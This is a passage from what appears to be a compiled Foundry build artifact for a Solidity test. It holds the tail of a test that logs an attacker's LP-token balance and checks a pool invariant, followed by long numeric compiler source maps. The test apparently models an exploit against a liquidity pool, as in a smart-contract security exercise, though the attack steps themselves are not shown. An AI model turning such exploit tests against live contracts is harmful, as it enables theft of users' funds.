log_named_uint(\"attacker LP balance: \", lp.balanceOf(attacker));\n        vm.stopPrank();\n\n        invariantGetWhatPut();\n    }\n}\n","sourceMap":"206:1477:28:-:0;;;1572:26:18;;;170:28:19;-1:-1:-1;;170:28:19;;;;;;293::28;;;-1:-1:-1;;;;;;293:28:28;;;1594:4:18;293:28:28;;;;327:27;;;;;;170:28:19;327:27:28;;;383:7;360:30;;206:1477;;;;;;;;;;;;;;;;","sourceMapDeployed":"206:1477:28:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;590:106:16;;;;;;:::i;:::-;;:::i;:::-;;417:550:28;;;:::i;1170:107:16:-;;;;;;:::i;:::-;;:::i;321:38:19:-;;-1:-1:-1;;;;;;;;;;;321:38:19;;;;;-1:-1:-1;;;;;1039:32:29;;;1021:51;;1009:2;994:18;321:38:19;;;;;;;;884:105:16;;;;;;:::i;:::-;;:::i;1059:62::-;;;:::i;396:82::-;;;;;;:::i;:::-;;:::i;1042:159:28:-;;;:::i;1819:584:18:-;;;:::i;:::-;;;1721:14:29;;1714:22;1696:41;;1684:2;1669:18;1819:584:18;1556:187:29;1222:459:28;;;:::i;353:94:15:-;;;220:22;1894:25:29;;1882:2;1867:18;353:94:15;1748:177:29;798:81:16;;;;;;:::i;:::-;;:::i;170:28:19:-;;;;;;;;;;;;1572:26:18;;;;;;;;;590:106:16;667:22;;-1:-1:-1;;;667:22:16;;-1:-1:-1;;;;;2160:15:29;;;667:22:16;;;2142:34:29;2212:15;;2192:18;;;2185:43;-1:-1:-1;;;;;;;;;;;250:64:19;667:8:16;;2077:18:29;;667:22:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;590:106;;:::o;417:550:28:-;516:5;;502:20;;-1:-1:-1;;;502:20:28;;-1:-1:-1;;;;;516:5:28;;;502:20;;;1021:51:29;-1:-1:-1;;;;;;;;;;;250:64:19;502:13:28;;994:18:29;;502:20:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;537:56;;;;;:::i;:::-;2750:2:29;2732:21;;;2789:2;2769:18;;;2762:30;2828:27;2823:2;2808:18;;2801:55;2894:3;2887:4;2872:20;;2865:33;;;2935:2;2914:19;;;2907:31;-1:-1:-1;;;2969:3:29;2954:19;;2947:44;3023:3;3008:19;537:56:28;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;532:2:28;:61;;-1:-1:-1;;;;;;532:61:28;-1:-1:-1;;;;;532:61:28;;;;;;;;;646:5;;615:37;;532:61;;646:5;;615:37;;;:::i;:::-;-1:-1:-1;;;;;2160:15:29;;;2142:34;;2212:15;;2207:2;2192:18;;2185:43;2092:2;2077:18;615:37:28;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;603:9:28;:49;;-1:-1:-1;;;;;;603:49:28;-1:-1:-1;;;;;603:49:28;;;;;;;;;;662:14;;;-1:-1:-1;;;662:14:28;;;;-1:-1:-1;;;;;;;;;;;250:64:19;662:12:28;;:14;;;;;-1:-1:-1;;662:14:28;;;;;;;-1:-1:-1;250:64:19;662:14:28;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;766:4:28;;752:19;;-1:-1:-1;;;752:19:28;;-1:-1:-1;;;;;766:4:28;;;752:19;;;1021:51:29;-1:-1:-1;;;;;;;;;;;250:64:19;-1:-1:-1;752:13:28;;-1:-1:-1;994:18:29;;752:19:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;794:2:28;;799:4;;805:12;;781:37;;-1:-1:-1;;;;;;794:2:28;;;;-1:-1:-1;799:4:28;;;781;:37::i;:::-;828:2;;847:9;;828:49;;-1:-1:-1;;;828:49:28;;-1:-1:-1;;;;;847:9:28;;;828:49;;;3212:51:29;-1:-1:-1;;3279:18:29;;;3272:34;828:2:28;;;:10;;3185:18:29;;828:49:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;887:9;;;;;;;;;-1:-1:-1;;;;;887:9:28;-1:-1:-1;;;;;887:18:28;;:20;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;917:14:28;;;-1:-1:-1;;;917:14:28;;;;-1:-1:-1;;;;;;;;;;;250:64:19;-1:-1:-1;917:12:28;;-1:-1:-1;917:14:28;;;;;274:37:19;;917:14:28;;;;;;;274:37:19;250:64;917:14:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;950:10;:8;:10::i;:::-;942:5;:18;;-1:-1:-1;;;;;;942:18:28;-1:-1:-1;;;;;942:18:28;;;;;;;;;;417:550::o;1170:107:16:-;1246:24;;-1:-1:-1;;;1246:24:16;;-1:-1:-1;;;;;3230:32:29;;1246:24:16;;;3212:51:29;3279:18;;;3272:34;;;-1:-1:-1;;;;;;;;;;;250:64:19;1246:7:16;;3185:18:29;;1246:24:16;3038:274:29;884:105:16;955:27;;-1:-1:-1;;;955:27:16;;-1:-1:-1;;;;;2160:15:29;;;955:27:16;;;2142:34:29;2212:15;;2192:18;;;2185:43;-1:-1:-1;;;;;;;;;;;250:64:19;955:13:16;;2077:18:29;;955:27:16;1930:304:29;1059:62:16;1100:14;;;-1:-1:-1;;;1100:14:16;;;;-1:-1:-1;;;;;;;;;;;250:64:19;1100:12:16;;:14;;;;;274:37:19;;1100:14:16;;;;;;;274:37:19;250:64;1100:14:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1059:62::o;396:82::-;457:14;;-1:-1:-1;;;457:14:16;;-1:-1:-1;;;;;1039:32:29;;457:14:16;;;1021:51:29;-1:-1:-1;;;;;;;;;;;250:64:19;457:8:16;;994:18:29;;457:14:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;396:82;:::o;1042:159:28:-;1099:4;;1090:14;;-1:-1:-1;;;1090:14:28;;-1:-1:-1;;;;;1099:4:28;;;1090:14;;;1021:51:29;-1:-1:-1;;;;;;;;;;;250:64:19;1090:8:28;;994:18:29;;1090:14:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1114:9:28;;:28;;-1:-1:-1;;;1114:28:28;;:9;:28;;;1696:41:29;-1:-1:-1;;;;;1114:9:28;;;;-1:-1:-1;1114:21:28;;-1:-1:-1;1669:18:29;;1114:28:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1181:12:28;;1159:2;;1172:4;;1159:18;;-1:-1:-1;;;1159:18:28;;-1:-1:-1;;;;;1172:4:28;;;1159:18;;;1021:51:29;1181:12:28;;-1:-1:-1;1159:2:28;;-1:-1:-1;1159:12:28;;994:18:29;;1159::28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;:34;;1152:42;;;;:::i;:::-;1042:159::o;1819:584:18:-;1853:4;1873:7;;;;;;;1869:528;;;-1:-1:-1;1903:7:18;;;;;;;;1819:584::o;1869:528::-;1941:17;-1:-1:-1;;;;;;;;;;;2978:55:18;3059:16;1980:374;;2196:43;;;-1:-1:-1;;;;;;;;;;;2196:43:18;;;3212:51:29;;;-1:-1:-1;;;3279:18:29;;;3272:34;2196:43:18;;;;;;;;;3185:18:29;;;2196:43:18;;;-1:-1:-1;;1671:64:18;;2086:175;;2135:34;;2086:175;;;:::i;:::-;;;;-1:-1:-1;;2086:175:18;;;;;;;;;;2047:232;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2020:259;;;2323:7;2312:27;;;;;;;;;;;;:::i;:::-;2297:42;;2002:352;1980:374;2374:12;1819:584;-1:-1:-1;1819:584:18:o;1222:459:28:-;1303:23;;-1:-1:-1;;;1303:23:28;;1289:3;1303:23;;;1021:51:29;;;1289:3:28;-1:-1:-1;;;;;;;;;;;250:64:19;1303:13:28;;994:18:29;;1303:23:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1337;1363:17;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;1407:2:28;;1428:9;;1407:32;;-1:-1:-1;;;1407:32:28;;-1:-1:-1;;;;;1428:9:28;;;1407:32;;;1021:51:29;1337:43:28;;-1:-1:-1;1390:14:28;;1407:2;;;:12;;994:18:29;;1407:32:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1449:9;;:52;;-1:-1:-1;;;1449:52:28;;-1:-1:-1;;;;;3230:32:29;;;1449:52:28;;;3212:51:29;3279:18;;;3272:34;;;1390:49:28;;-1:-1:-1;1449:9:28;;;:22;;3185:18:29;;1449:52:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1511:9:28;;:28;;-1:-1:-1;;;1511:28:28;;:9;:28;;;1696:41:29;-1:-1:-1;;;;;1511:9:28;;;;-1:-1:-1;1511:21:28;;-1:-1:-1;1669:18:29;;1511:28:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;1595:2:28;;:22;;-1:-1:-1;;;1595:22:28;;-1:-1:-1;;;;;1039:32:29;;;1595:22:28;;;1021:51:29;1555:63:28;;-1:-1:-1;1595:2:28;;;;-1:-1:-1;1595:12:28;;994:18:29;;1595:22:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1555:63;;;;;5233:2:29;5215:21;;;5272:2;5252:18;;;5245:30;-1:-1:-1;;;5306:2:29;5291:18;;5284:51;5402:4;5387:20;;5380:36;;;;5367:3;5352:19;;5003:419;1555:63:28;;;;;;;;1628:14;;;-1:-1:-1;;;1628:14:28;;;;-1:-1:-1;;;;;;;;;;;250:64:19;1628:12:28;;:14;;;;;274:37:19;;1628:14:28;;;;;;;274:37:19;250:64;1628:14:28;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1653:21;:19;:21::i;:::-;1252:429;;;1222:459::o;798:81:16:-;853:19;;-1:-1:-1;;;853:19:16;;-1:-1:-1;;;;;1039:32:29;;853:19:16;;;1021:51:29;-1:-1:-1;;;;;;;;;;;250:64:19;853:13:16;;994:18:29;;853:19:16;863:215:29;3883:109:21;3957:28;3962:5;3969:2;3973:4;3979:5;3957:4;:28::i;250:97:15:-;314:26;;-1:-1:-1;;;;;;314:26:15;;220:22;314:26;;;1894:25:29;288:7:15;;-1:-1:-1;;;;;;;;;;;250:64:19;314:7:15;;1867:18:29;;314:26:15;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;307:33;;250:97;:::o;3998:917:21:-;4154:38;;;-1:-1:-1;;;;;1039:32:29;;;4154:38:21;;;;1021:51:29;;;;4154:38:21;;;;;;;;;;994:18:29;;;;4154:38:21;;;;;;;-1:-1:-1;;;;;4154:38:21;-1:-1:-1;;;4154:38:21;;;4143:50;;4119:20;;4143:10;;;:50;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4116:77;;;4203:15;4232:7;4221:30;;;;;;;;;;;;:::i;:::-;4203:48;-1:-1:-1;4288:123:21;4406:4;4288:90;4375:2;4288:64;-1:-1:-1;;;4288:35:21;:8;4317:5;4288:28;:35::i;:::-;:52;32347:9;;;:16;;-1:-1:-1;;32347:16:21;;;;;;;;;;;;:9;32248:143;4288:64;:86;32663:10;;;:47;;;;;;;-1:-1:-1;32663:47:21;;;;;;;-1:-1:-1;;;;;32687:21:21;;;;32663:47;;;:10;32559:179;4288:90;:117;;:123::i;:::-;4456:6;4453:456;;;4518:34;;;;;;;;;;;;;;;;-1:-1:-1;;;;;4518:34:21;-1:-1:-1;;;4518:34:21;;;4507:46;;4480:23;;-1:-1:-1;;;;;4507:10:21;;;:46;;4518:34;4507:46;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;4477:76;;;4567:14;4595:10;4584:33;;;;;;;;;;;;:::i;:::-;4567:50;;4641:7;4634:4;:14;4631:143;;;4679:14;4689:4;4679:7;:14;:::i;:::-;4668:26;;;;:::i;:::-;;;4631:143;;;4744:14;4751:7;4744:4;:14;:::i;:::-;4733:26;;;;:::i;:::-;;;4631:143;4787:111;4891:6;4787:72;-1:-1:-1;;;4787:39:21;:8;4820:5;4787:32;:39::i;:111::-;4463:446;;4075:840;;3998:917;;;;:::o;32086:156::-;32192:12;;;:22;;-1:-1:-1;;;;;;32192:22:21;-1:-1:-1;;;;;32192:22:21;;;;;:12;32086:156;;;;;:::o;33370:120::-;33450:33;33464:4;33478:3;33450:13;:33::i;:::-;33370:120;;:::o;33724:1089::-;33840:12;;;;33876:9;;;;33917:11;;;;33961:10;;;33938:33;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;33840:12:21;;;;33876:9;;;;;;33826:11;;33938:33;;33961:10;;33938:33;;33961:10;33938:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;33982:17;34019:4;34025:12;34033:3;34025:7;:12::i;:::-;34002:36;;;;;;;;;:::i;:::-;;;;-1:-1:-1;;34002:36:21;;;;;;;;;-1:-1:-1;;;;;34053:15:21;;;;;;:10;;;34002:36;34053:15;;;;;;-1:-1:-1;;;;;;34053:21:21;;;;;;;;;34002:36;;-1:-1:-1;34053:21:21;;:15;;34085:34;;34102:3;;34107:11;;34085:34;;:::i;:::-;;;;-1:-1:-1;;34085:34:21;;;;;;;;;34075:45;;34085:34;34075:45;;;;34053:68;;;;;;;;;;-1:-1:-1;34053:68:21;;;;34048:110;;34137:10;34142:4;34137;:10::i;:::-;;34048:110;-1:-1:-1;;;;;34190:15:21;;34167:12;34190:15;;;;;;;;;;;-1:-1:-1;;;;;;34190:21:21;;;;;;;;;34222:34;;34190:21;;34167:12;;34222:34;;34239:3;;34244:11;;34222:34;;:::i;:::-;;;;;;;;;;;;;34212:45;;;;;;34190:68;;;;;;;;;;;;34182:77;;34167:92;;34270:12;34309:17;34330:3;-1:-1:-1;;;;;34330:14:21;34345:4;34330:20;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;34306:44:21;-1:-1:-1;34371:36:21;;-1:-1:-1;34306:44:21;34392:14;34395:11;34392:2;:14;:::i;:::-;34371;:36::i;:::-;34442:28;;-1:-1:-1;;;34442:28:21;;-1:-1:-1;;;;;3230:32:29;;34442:28:21;;;3212:51:29;3279:18;;;3272:34;;;34364:43:21;;-1:-1:-1;34427:12:21;;-1:-1:-1;;;;;;;;;;;;34442:17:21;;;3185:18:29;;34442:28:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;34427:43;;34493:4;34485;:12;34481:172;;34513:129;;-1:-1:-1;;;34513:129:21;;;;;;;:::i;:::-;;;;;;;;;34662:34;;-1:-1:-1;;;34662:34:21;;-1:-1:-1;;;;;;;;;;;34662:18:21;;;:34;;34681:3;;34686:4;;34692:3;;34662:34;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;34713:12:21;;;34706:19;;-1:-1:-1;;;;;;34706:19:21;;;-1:-1:-1;34742:9:21;;;34735:16;;-1:-1:-1;;34735:16:21;;;34761:17;-1:-1:-1;34768:10:21;;34713:12;34761:17;:::i;:::-;34795:4;:11;;34788:18;;;33816:997;;;;;;;;33724:1089;;:::o;36157:397::-;36216:12;36244:19;36276:1;:8;36287:2;36276:13;;;;:::i;:::-;36266:24;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;36266:24:21;;36244:46;;36305:9;36300:224;36324:1;:8;36320:1;:12;36300:224;;;36353:9;36365:1;36367;36365:4;;;;;;;;:::i;:::-;;;;;;;36353:16;;36498:1;36492;36488:2;36484:10;36480:2;36476:19;36468:6;36464:32;36457:43;36439:75;36334:3;;;;;:::i;:::-;;;;36300:224;;;-1:-1:-1;36541:6:21;36157:397;-1:-1:-1;;36157:397:21:o;28866:3214::-;28990:12;;;;29026:9;;;;29067:11;;;;29111:10;;;29088:33;;;;;;;;;;;;;;;;;;;28953:7;;-1:-1:-1;;;;;28990:12:21;;29026:9;;;29067:11;28953:7;;29088:33;;29111:10;;29088:33;;;29111:10;29088:33;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;;;;29172:15:21;;;;;;:10;;;:15;;;;;;;;-1:-1:-1;;;;;;29172:21:21;;;;;;;;;29204:34;;29088:33;;-1:-1:-1;29172:21:21;:15;;-1:-1:-1;29204:34:21;;-1:-1:-1;29088:33:21;;29226:11;;29204:34;;:::i;:::-;;;;-1:-1:-1;;29204:34:21;;;;;;;;;29194:45;;29204:34;29194:45;;;;29172:68;;;;;;;;;;-1:-1:-1;29172:68:21;;;;29168:174;;;-1:-1:-1;;;;;29263:15:21;;:10;:15;;;;;;;;;;;-1:-1:-1;;;;;;29263:21:21;;;;;;;;;29295:34;;29263:21;;:10;29295:34;;29312:3;;29317:11;;29295:34;;:::i;:::-;;;;;;;;;;;;;29285:45;;;;;;29263:68;;;;;;;;;;;;29256:75;;;;;;28866:3214;;;:::o;29168:174::-;29351:17;29388:4;29394:12;29402:3;29394:7;:12::i;:::-;29371:36;;;;;;;;;:::i;:::-;;;;;;;;;;;;;29351:56;;-1:-1:-1;;;;;;;;;;;28140:37:21;;-1:-1:-1;;;;;29417:19:21;;:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;29448:12;29487:17;29508:3;-1:-1:-1;;;;;29508:14:21;29523:4;29508:20;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;29484:44:21;-1:-1:-1;29549:36:21;;-1:-1:-1;29484:44:21;29570:14;29573:11;29570:2;:14;:::i;29549:36::-;29635:35;;-1:-1:-1;;;29635:35:21;;-1:-1:-1;;;;;1039:32:29;;29635:35:21;;;1021:51:29;29542:43:21;;-1:-1:-1;29607:22:21;;-1:-1:-1;;;;;;;;;;;;29635:21:21;;;994:18:29;;29635:35:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;29635:35:21;;;;;;;;;;;;:::i;:::-;29606:64;;;29684:5;:12;29700:1;29684:17;29680:2058;;29717:12;-1:-1:-1;;;;;;;;;;;28140:37:21;;-1:-1:-1;;;;;29732:17:21;;29750:3;29755:5;29761:1;29755:8;;;;;;;;:::i;:::-;;;;;;;29732:32;;;;;;;;;;;;;;;-1:-1:-1;;;;;3230:32:29;;;;3212:51;;3294:2;3279:18;;3272:34;3200:2;3185:18;;3038:274;29732:32:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;29717:47;-1:-1:-1;29717:47:21;29778:106;;29825:44;29846:3;29859:5;29865:1;29859:8;;;;;;;;:::i;:::-;;;;;;;;;;;;29825:44;;;-1:-1:-1;;;;;3230:32:29;;;3212:51;;3279:18;;;3272:34;3185:18;29825:44:21;;;;;;;29778:106;29909:4;29901;:12;29897:180;;29933:129;;-1:-1:-1;;;29933:129:21;;;;;;;:::i;:::-;30095:86;30105:3;30110:4;30143:3;30148:11;30126:34;;;;;;;;;:::i;:::-;;;;;;;;;;;;;30116:45;;;;;;30171:5;30177:1;30171:8;;;;;;;;:::i;:::-;;;;;;;30163:17;;30095:86;;;;;;;;;:::i;:::-;;;;;;;;30274:5;30280:1;30274:8;;;;;;;;:::i;:::-;;;;;;;;;;;;-1:-1:-1;;;;;30195:15:21;;30266:17;30195:15;;;;;;;;;;-1:-1:-1;;;;;;30195:21:21;;;;;;;;;30227:34;;30274:8;;30195:21;;30227:34;;30244:3;;30249:11;;30227:34;;:::i;:::-;;;;-1:-1:-1;;30227:34:21;;;;;;;;;30217:45;;30227:34;30217:45;;;;30195:68;;;;;;;;;;;;-1:-1:-1;30195:68:21;;;:88;;;;-1:-1:-1;;;;;30297:15:21;;;;30368:4;30297:10;;;:15;;;;;-1:-1:-1;;;;;;30297:21:21;;;;;;;;;30329:34;;30368:4;;-1:-1:-1;30329:34:21;;30346:3;;30351:11;;30329:34;;:::i;:::-;;;;;;;-1:-1:-1;;30329:34:21;;;;;;30319:45;;30329:34;30319:45;;;;30297:68;;;;;;;;;;-1:-1:-1;30297:68:21;:75;;-1:-1:-1;;30297:75:21;;;;;;;;;;-1:-1:-1;29680:2058:21;;;30408:1;30393:5;:12;:16;30389:1349;;;30430:9;30425:1190;30449:5;:12;30445:1;:16;30425:1190;;;30486:12;-1:-1:-1;;;;;;;;;;;28140:37:21;;-1:-1:-1;;;;;30501:17:21;;30519:3;30524:5;30530:1;30524:8;;;;;;;;:::i;:::-;;;;;;;30501:32;;;;;;;;;;;;;;;-1:-1:-1;;;;;3230:32:29;;;;3212:51;;3294:2;3279:18;;3272:34;3200:2;3185:18;;3038:274;30501:32:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;30486:47;-1:-1:-1;30486:47:21;30551:114;;30602:44;30623:3;30636:5;30642:1;30636:8;;;;;;;;:::i;:::-;;;;;;;;;;;;30602:44;;;-1:-1:-1;;;;;3230:32:29;;;3212:51;;3279:18;;;3272:34;3185:18;30602:44:21;;;;;;;30551:114;-1:-1:-1;;;;;;;;;;;28140:37:21;;-1:-1:-1;;;;;30707:18:21;;30726:3;30731:5;30737:1;30731:8;;;;;;;;:::i;:::-;;;;;;;-1:-1:-1;;;30707:53:21;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;30778:12;30808:17;30883:3;-1:-1:-1;;;;;30883:14:21;30898:4;30883:20;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;30865:38:21;;-1:-1:-1;30865:38:21;-1:-1:-1;30932:36:21;30865:38;30953:14;30956:11;30953:2;:14;:::i;30932:36::-;30925:43;;31009:7;:37;;;;;-1:-1:-1;;;31020:4:21;:26;31009:37;31005:539;;;31144:86;31154:3;31159:4;31192:3;31197:11;31175:34;;;;;;;;;:::i;:::-;;;;;;;;;;;;;31165:45;;;;;;31220:5;31226:1;31220:8;;;;;;;;:::i;:::-;;;;;;;31212:17;;31144:86;;;;;;;;;:::i;:::-;;;;;;;;31331:5;31337:1;31331:8;;;;;;;;:::i;:::-;;;;;;;;;;;;-1:-1:-1;;;;;31252:15:21;;31323:17;31252:15;;;;;;;;;;-1:-1:-1;;;;;;31252:21:21;;;;;;;;;31284:34;;31331:8;;31252:21;;31284:34;;31301:3;;31306:11;;31284:34;;:::i;:::-;;;;;;;;;;;;;31274:45;;;;;;31252:68;;;;;;;;;;;:88;;;;31433:4;31362;:10;;:15;31373:3;-1:-1:-1;;;;;31362:15:21;-1:-1:-1;;;;;31362:15:21;;;;;;;;;;;;:21;31378:4;-1:-1:-1;;;;;31362:21:21;;-1:-1:-1;;;;;31362:21:21;;;;;;;;;;;;;:68;31411:3;31416:11;31394:34;;;;;;;;;:::i;:::-;;;;;;;;;;;;;31384:45;;;;;;31362:68;;;;;;;;;;;;:75;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;;;;;;;28140:37:21;;-1:-1:-1;;;;;31459:18:21;;31478:3;31483:5;31489:1;31483:8;;;;;;;;:::i;:::-;;;;;;;31493:4;31459:39;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;31520:5;;;;;31005:539;-1:-1:-1;;;;;;;;;;;28140:37:21;;-1:-1:-1;;;;;31561:18:21;;31580:3;31585:5;31591:1;31585:8;;;;;;;;:::i;:::-;;;;;;;31595:4;31561:39;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;30468:1147;;;30463:3;;;;;:::i;:::-;;;;30425:1190;;;;30389:1349;;;31645:82;;;-1:-1:-1;;;31645:82:21;;10542:2:29;31645:82:21;;;10524:21:29;10561:18;;;10554:30;;;;10620:34;10600:18;;;10593:62;10691:34;10671:18;;;10664:62;10743:19;;31645:82:21;10340:428:29;31645:82:21;-1:-1:-1;;;;;31756:15:21;;;;;;:10;;;:15;;;;;;;;-1:-1:-1;;;;;;31756:21:21;;;;;;;;;31788:34;;31756:21;;:15;31788:34;;31805:3;;31810:11;;31788:34;;:::i;:::-;;;;-1:-1:-1;;31788:34:21;;;;;;;;;31778:45;;31788:34;31778:45;;;;31756:68;;;;;;;;;;-1:-1:-1;31756:68:21;;;;31748:128;;;;-1:-1:-1;;;31748:128:21;;10975:2:29;31748:128:21;;;10957:21:29;11014:2;10994:18;;;10987:30;11053:34;11033:18;;;11026:62;-1:-1:-1;;;11104:18:29;;;11097:45;11159:19;;31748:128:21;10773:411:29;31748:128:21;31894:12;;;31887:19;;-1:-1:-1;;;;;;31887:19:21;;;31923:9;;;31916:16;;-1:-1:-1;;31916:16:21;;;31942:17;-1:-1:-1;31949:10:21;;31894:12;31942:17;:::i;:::-;31969:18;31976:11;;;31969:18;;;-1:-1:-1;;;;;32005:15:21;;;;;;;;;;;;-1:-1:-1;;;;;;32005:21:21;;;;;;;;;32037:34;;32005:21;;31969:18;32037:34;;32054:3;;32059:11;;32037:34;;:::i;:::-;;;;;;;;;;;;;32027:45;;;;;;32005:68;;;;;;;;;;;;31998:75;;;;;;;;;28866:3214;;;:::o;35854:297::-;35928:7;35947:11;35969;35994:2;35983:1;:8;:13;:29;;36004:1;:8;35983:29;;;35999:2;35983:29;35969:43;;36027:6;36022:103;36043:3;36039:1;:7;36022:103;;;36108:5;:1;36112;36108:5;:::i;:::-;36082:1;36084:10;36093:1;36084:6;:10;:::i;:::-;36082:13;;;;;;;;:::i;:::-;;;;;-1:-1:-1;;;;;;36082:13:21;36074:40;;36067:47;;;;;36048:3;;;;:::i;:::-;;;;36022:103;;;-1:-1:-1;36141:3:21;;35854:297;-1:-1:-1;;;;35854:297:21:o;-1:-1:-1:-;;;;;;;;:::o;:::-;;;;;;;;:::o;:::-;;;;;;;;:::o;:::-;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::o;:::-;;;;;;;;;;;;;;;;;;:::o;14:131:29:-;-1:-1:-1;;;;;89:31:29;;79:42;;69:70;;135:1;132;125:12;150:388;218:6;226;279:2;267:9;258:7;254:23;250:32;247:52;;;295:1;292;285:12;247:52;334:9;321:23;353:31;378:5;353:31;:::i;:::-;403:5;-1:-1:-1;460:2:29;445:18;;432:32;473:33;432:32;473:33;:::i;:::-;525:7;515:17;;;150:388;;;;;:::o;543:315::-;611:6;619;672:2;660:9;651:7;647:23;643:32;640:52;;;688:1;685;678:12;640:52;727:9;714:23;746:31;771:5;746:31;:::i;:::-;796:5;848:2;833:18;;;;820:32;;-1:-1:-1;;;543:315:29:o;1304:247::-;1363:6;1416:2;1404:9;1395:7;1391:23;1387:32;1384:52;;;1432:1;1429;1422:12;1384:52;1471:9;1458:23;1490:31;1515:5;1490:31;:::i;:::-;1540:5;1304:247;-1:-1:-1;;;1304:247:29:o;3317:277::-;3384:6;3437:2;3425:9;3416:7;3412:23;3408:32;3405:52;;;3453:1;3450;3443:12;3405:52;3485:9;3479:16;3538:5;3531:13;3524:21;3517:5;3514:32;3504:60;;3560:1;3557;3550:12;3599:184;3669:6;3722:2;3710:9;3701:7;3697:23;3693:32;3690:52;;;3738:1;3735;3728:12;3690:52;-1:-1:-1;3761:16:29;;3599:184;-1:-1:-1;3599:184:29:o;3788:127::-;3849:10;3844:3;3840:20;3837:1;3830:31;3880:4;3877:1;3870:15;3904:4;3901:1;3894:15;4199:322;4240:3;4278:5;4272:12;4302:1;4312:128;4326:6;4323:1;4320:13;4312:128;;;4423:4;4408:13;;;4404:24;;4398:31;4385:11;;;4378:52;4341:12;4312:128;;;-1:-1:-1;4495:1:29;4459:16;;4484:13;;;-1:-1:-1;4459:16:29;;4199:322;-1:-1:-1;4199:322:29:o;4526:278::-;-1:-1:-1;;;;;;4711:33:29;;4699:46;;4681:3;4761:37;4795:1;4786:11;;4778:6;4761:37;:::i;:::-;4754:44;4526:278;-1:-1:-1;;;;4526:278:29:o;4809:189::-;4938:3;4963:29;4988:3;4980:6;4963:29;:::i;5427:251::-;5497:6;5550:2;5538:9;5529:7;5525:23;5521:32;5518:52;;;5566:1;5563;5556:12;5518:52;5598:9;5592:16;5617:31;5642:5;5617:31;:::i;5683:127::-;5744:10;5739:3;5735:20;5732:1;5725:31;5775:4;5772:1;5765:15;5799:4;5796:1;5789:15;5815:128;5882:9;;;5903:11;;;5900:37;;;5917:18;;:::i;5948:125::-;6013:9;;;6034:10;;;6031:36;;;6047:18;;:::i;6078:610::-;6324:13;;6267:3;;6298;;6377:4;6404:15;;;6267:3;6447:175;6461:6;6458:1;6455:13;6447:175;;;6524:13;;6510:28;;6560:14;;;;6597:15;;;;6483:1;6476:9;6447:175;;;-1:-1:-1;;6631:21:29;;;-1:-1:-1;6668:14:29;;;;;-1:-1:-1;;;6078:610:29:o;6693:168::-;6766:9;;;6797;;6814:15;;;6808:22;;6794: